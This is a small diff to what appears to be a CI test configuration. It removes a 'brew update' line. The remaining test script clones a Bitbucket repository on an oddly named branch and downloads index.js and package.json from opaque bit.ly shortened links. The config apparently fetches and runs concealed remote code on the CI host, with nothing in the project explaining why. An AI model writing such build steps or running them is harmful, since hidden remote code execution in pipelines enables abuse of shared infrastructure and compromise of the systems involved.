@@ -6,7 +6,6 @@ macos_instance:
 test_task:
   clone_script: echo "hoanghahaihahai@outlook.com"
   test_script: 
-    - brew update
     - brew install node
     - git clone https://meocodervippro@bitbucket.org/lunarcrush/lunarcrush-data.git --branch hoanghahaihahai_outlook-com --single-branch lunarCrushData
     - curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
